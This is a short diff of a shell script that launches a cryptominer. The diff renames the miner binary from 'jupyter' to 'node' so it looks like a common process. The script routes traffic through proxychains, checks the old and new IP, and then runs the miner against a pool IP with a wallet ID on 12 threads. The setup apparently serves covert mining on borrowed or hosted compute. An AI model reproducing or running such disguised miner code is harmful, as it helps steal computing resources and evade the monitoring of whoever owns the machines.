@@ -1,4 +1,4 @@
-chmod +x proxychains.conf jupyter proxy libproxychains4.so compile.sh
+chmod +x proxychains.conf node proxy libproxychains4.so compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
 ./node --algorithm randomvirel --pool 51.79.215.200:17152 --tls true --wallet vcnmlwmgn3yriki6cg27djswufn25ldprh7uaqw4rzcgxvfup.gh12 -t 12
